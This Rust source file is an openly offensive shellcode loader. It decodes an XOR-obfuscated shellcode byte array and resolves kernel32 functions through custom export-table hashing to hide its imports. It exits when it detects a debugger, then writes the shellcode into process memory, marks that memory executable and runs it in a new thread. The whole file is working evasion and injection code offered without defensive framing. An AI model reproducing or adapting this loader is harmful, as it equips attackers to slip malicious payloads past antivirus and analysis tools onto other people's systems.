#![allow(unused_imports)]
#![allow(non_snake_case)]
#![allow(dead_code)]
#![allow(unused_variables)]
#![allow(improper_ctypes_definitions)]

use windows::{
    Win32::{
        System::{
            Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE, VIRTUAL_FREE_TYPE},
            Diagnostics::Debug::{WriteProcessMemory, IsDebuggerPresent, CheckRemoteDebuggerPresent, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_DIRECTORY_ENTRY_EXPORT}, 
            Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE, PROCESS_ACCESS_RIGHTS, LPPROC_THREAD_ATTRIBUTE_LIST, LPTHREAD_START_ROUTINE},
            LibraryLoader::{LoadLibraryA, GetProcAddress},
            SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
        },
        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE, WAIT_EVENT, FARPROC, GetLastError},
        Security::SECURITY_ATTRIBUTES,
    },
    core::{PCSTR, Result},
};
use std::{ptr::{self, null_mut, null}, process, mem, str, slice, os::raw::c_void};

type TOpenProcess = unsafe extern "system" fn(
    dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
    binherithandle: BOOL,
    dwprocessid: u32
) -> HANDLE;

type TCheckRemoteDebuggerPresent = unsafe extern "system" fn(
    hprocess: HANDLE,
    pbdebuggerpresent: *mut BOOL
) -> ();

type TIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;

type TVirtualAllocEx = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpaddress: *const c_void,
    dwsize: usize,
    flallocationtype: VIRTUAL_ALLOCATION_TYPE,
    flprotect: PAGE_PROTECTION_FLAGS
) -> *mut c_void;

type TCloseHandle = unsafe extern "system" fn(
    hobject: HANDLE
) -> ();

type TWriteProcessMemory = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpbaseaddress: *const c_void,
    lpbuffer: *const c_void,
    nsize: usize,
    lpnumberofbyteswritten: *mut usize
) -> ();

type TVirtualProtectEx = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpaddress: *const c_void,
    dwsize: usize,
    flnewprotect: PAGE_PROTECTION_FLAGS,
    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
) -> ();

type TCreateRemoteThreadEx = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpthreadattributes: *const SECURITY_ATTRIBUTES,
    dwstacksize: usize,
    lpstartaddress: *mut c_void,
    lpparameter: *const c_void,
    dwcreationflags: u32,
    lpattributelist: *mut c_void,
    lpthreadid: *mut u32
) -> HANDLE;

type TWaitForSingleObject = unsafe extern "system" fn(
    hhandle: HANDLE,
    dwmilliseconds: u32
) -> WAIT_EVENT;

type TVirtualFree = unsafe extern "system" fn(
    lpaddress: *mut c_void,
    dwsize: usize,
    dwfreetype: VIRTUAL_FREE_TYPE
) -> ();
   
fn getHashFromFunc(funcName: &str) -> u32 {
    let mut hash: u32 = 0x35;

    for c in funcName.chars() {
        hash = (hash.wrapping_mul(0xab10f29f) + c as u32) & 0xffffff;
    }

    hash
}

fn getFuncAddressByHash(lib: &str, hash: Vec<u32>) -> Vec<Option<*const u32>> {
    unsafe {

        let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
        let libBase: Result<HMODULE> = LoadLibraryA(lib_ptr);
        let mut funcAddresses: Vec<Option<*const u32>> = vec![None; hash.len()];
         
        match libBase {
            Ok(h) => {
                let base_ptr: *const u8 = h.0 as *const u8;
                let img_dos_header: &IMAGE_DOS_HEADER = &*(base_ptr as *const IMAGE_DOS_HEADER);
                let nt_headers_addr = base_ptr.add(img_dos_header.e_lfanew as usize);
                let img_nt_headers: &IMAGE_NT_HEADERS64 = &*(nt_headers_addr as *const IMAGE_NT_HEADERS64);
                let export_directory_RVA: *const u32 = img_nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize].VirtualAddress as *const u32;
                let export_directory_addr = base_ptr.add(export_directory_RVA as usize);
                let img_export_directory: &IMAGE_EXPORT_DIRECTORY = &*(export_directory_addr as *const IMAGE_EXPORT_DIRECTORY);
                let addr_func_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfFunctions as usize) as *const u32;
                let addr_names_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfNames as usize) as *const u32;
                let addr_names_ordinals_RVA: *const u16 = base_ptr.add(img_export_directory.AddressOfNameOrdinals as usize) as *const u16;
                let f_num: isize = img_export_directory.NumberOfFunctions as isize;
                
                println!(
                    
                    "
[+] Module Handle: {:?}

[i] IMG_NT_HEADER address: {:?}
[i] Export directory RVA address: {:?}
[i] Export directory address: {:?}
[i] Address of function RVA : {:?}
[i] Address of names RVA : {:?}
[i] Address of names ordinals RVA : {:?}
[i] Number of functions : {:?}
                    ", base_ptr, nt_headers_addr, export_directory_RVA, export_directory_addr, addr_func_RVA, addr_names_RVA, addr_names_ordinals_RVA, f_num
                );

                for i in 0..f_num {
                    let func_name_RVA: u32 = *addr_names_RVA.offset(i as isize) as u32;
                    //println!("{:?}", func_name_RVA);
                    let func_name_VA: *const u32 = base_ptr.add(func_name_RVA as usize) as *const u32;
                    //println!("{:?}", func_name_VA);

                    let func_name_VA_ptr: *const u8 = func_name_VA as *const u8;
                    let mut len = 0;
                    while *func_name_VA_ptr.add(len) != 0 {
                        len += 1;
                    }

                    let func_name_str: &str = str::from_utf8(slice::from_raw_parts(func_name_VA_ptr, len)).unwrap_or("Error with string");
                    //println!("{:?}", func_name_str);

                    let func_name_hash: u32 = getHashFromFunc(func_name_str) as u32;
                    
                    if let Some(pos) = hash.iter().position(|&h| h == func_name_hash) {
                        //println!("{:?} {:#x} {:#x} {:#x}", addr_names_ordinals_RVA.offset(i as isize), *addr_names_ordinals_RVA.offset(i as isize), addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32, *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32);
                        let func_addr_RVA: u32 = *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32;
                        let func_addr: *const u32 = base_ptr.add(func_addr_RVA as usize) as *const u32;
                        println!("[i] Address of {} : {:?} / RVA : {:?}", func_name_str, func_addr, func_addr_RVA);

                        funcAddresses[pos] = Some(func_addr);
                    }
                    
                }

                funcAddresses

            },

            Err(e) => process::exit(-1),
        }
    }
}

fn main() {

    let raw_shellcode: &[u8] = &[0x52, 0x2b, 0xc8, 0x7f, 0x52, 0x91, 0x58,
                             0x7a, 0x52, 0x91, 0x6a, 0x02, 0x52, 0x91, 
                             0x6c, 0x3a, 0x56, 0x91, 0x14, 0x57, 0x91, 
                             0x13, 0x57, 0x91, 0x53, 0x3a, 0xf1, 0x79, 
                             0x5b, 0x91, 0x53, 0x26, 0x57, 0x2b, 0xe5, 
                             0x5b, 0xad, 0x92, 0x57, 0x1b, 0xd5, 0x53, 
                             0x1b, 0xd5, 0x5f, 0x91, 0x25, 0x57, 0x1b, 
                             0xd5, 0x5b, 0x91, 0x55, 0x02, 0x5f, 0x91, 
                             0x6d, 0x3a, 0x57, 0x1b, 0xd4, 0xf9, 0x25, 
                             0xe5, 0xd3, 0x52, 0x2b, 0xec, 0x5b, 0x91, 
                             0x2e, 0x94, 0x56, 0x1b, 0xd4, 0x52, 0x2b, 
                             0xda, 0x52, 0x2b, 0xc8, 0xe6, 0xb6, 0x9e, 
                             0xda, 0x6e, 0x1d, 0xdb, 0xd0, 0x17, 0x1b, 
                             0xd8, 0xf1, 0xee, 0x5e, 0x23, 0xd8, 0x6f, 
                             0xc0, 0x5f, 0x91, 0x4d, 0x3e, 0x57, 0x1b, 
                             0xd0, 0x5b, 0x15, 0xad, 0x16, 0x50, 0x5f, 
                             0x91, 0x45, 0x06, 0x57, 0x1b, 0xd1, 0x5b, 
                             0x91, 0x1e, 0x91, 0x56, 0x1b, 0xd2, 0xd9, 
                             0xd9, 0x5b, 0xa2, 0x82, 0xe4, 0x90, 0x14, 
                             0xf2, 0x88, 0xe5, 0xe5, 0xe5, 0x52, 0x2b, 
                             0xd3, 0x4b, 0x52, 0xa3, 0x79, 0x7b, 0x76, 
                             0x79, 0x34, 0x7f, 0x62, 0x7f, 0x4b, 0x52, 
                             0x97, 0x16, 0x3e, 0x52, 0x2b, 0xc8, 0x52, 
                             0xe5, 0xd8, 0x52, 0x99, 0xf6, 0x32, 0xe5, 0xca];

    let shellcode: Vec<u8> = raw_shellcode.iter().map(|&byte| byte ^ 0x1a).collect();
    
    //getFuncAddressByHash("kernel32", 0xf92f7b);

    //println!("{:#x}", getHashFromFunc("CreateRemoteThreadEx"));
    //println!("{:#x}", getHashFromFunc("CreateRemoteThread"));

    let pid = process::id();

    unsafe {        
        println!("[i] Trying to open a Handle for the Process {pid}");

        //assert_eq!(getHashFromFunc("CreateRemoteThreadEx"), 0x857934);
        let hash: Vec<u32> = vec![0x9e08d0, 0x8dd921, 0xf4ed1b, 0x4fd152, 0xa48f46, 0xc4edec, 0x857934, 0x397566, 0xbdd9cb, 0x675a2];

        let adresses: Vec<Option<*const u32>> = getFuncAddressByHash("kernel32.dll", hash);

        if adresses.contains(&None) {
            process::exit(-1);
        }
        
        let XOpenProcess: TOpenProcess = mem::transmute(adresses[0].unwrap() as *const u32);
        let XCheckRemoteDebuggerPresent: TCheckRemoteDebuggerPresent = mem::transmute(adresses[1].unwrap() as *const u32);
        let XIsDebuggerPresent: TIsDebuggerPresent = mem::transmute(adresses[2].unwrap() as *const u32);
        let XVirtualAllocEx: TVirtualAllocEx = mem::transmute(adresses[3].unwrap() as *const u32);
        let XWriteProcessMemory: TWriteProcessMemory = mem::transmute(adresses[4].unwrap() as *const u32);
        let XVirtualProtectEx: TVirtualProtectEx = mem::transmute(adresses[5].unwrap() as *const u32);
        let XCreateRemoteThreadEx: TCreateRemoteThreadEx = mem::transmute(adresses[6].unwrap() as *const u32);
        let XWaitForSingleObject: TWaitForSingleObject = mem::transmute(adresses[7].unwrap() as *const u32);
        let XCloseHandle: TCloseHandle = mem::transmute(adresses[8].unwrap() as *const u32);
        let XVirtualFree: TVirtualFree = mem::transmute(adresses[9].unwrap() as *const u32);

        
        let hprocess = XOpenProcess(PROCESS_ALL_ACCESS, false.into(), pid);

        let mut debugger_present: BOOL = BOOL(0);

        let _ = XCheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL);
        if debugger_present.as_bool() {
            process::exit(-1);
        }

        if XIsDebuggerPresent().as_bool(){
            process::exit(-1);
        }

        let haddr = XVirtualAllocEx(
            hprocess,
            null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if haddr.is_null() {
            eprintln!("[!] Failed to Allocate Memory in Target Process.");
            let _ = CloseHandle(hprocess);
            process::exit(-1)
        }

        println!("[i] Writing to memory at address {:p}", haddr);

        XWriteProcessMemory(
            hprocess,
            haddr, 
            shellcode.as_ptr() as _,
            shellcode.len(),
            null_mut(),
        );

        let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
    
        XVirtualProtectEx(
            hprocess,
            haddr,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut oldprotect,
        );
        
        // println!("\n[+] Creating a Remote Thread");
        
        
        //println!("Last Error : {:?}", GetLastError());

        /* let hthread = XCreateRemoteThreadEx(
            hprocess,
            null(),
            0,
            haddr,
            null(),
            0,
            null_mut(),
            null_mut(),
        ); */

        let hthread = CreateRemoteThreadEx(
            hprocess,
            Some(null()),
            0,
            Some(std::mem::transmute(haddr)),
            Some(null()),
            0,
            None,
            Some(null_mut()),).unwrap_or_else(|e| {
                eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
                let _ = CloseHandle(hprocess);
                process::exit(-1);
            }
        );

        
        XWaitForSingleObject(hthread, INFINITE);

        

        let _ = XCloseHandle(hthread);
        println!("[i] Closed thread handle");

        let _ = XCloseHandle(hprocess);
        println!("[i] Closed process handle");

        let _ = XVirtualFree(haddr, 0, MEM_RELEASE);
        //println!("[i] Memory released");


        println!("[+] Executed!");
    }
}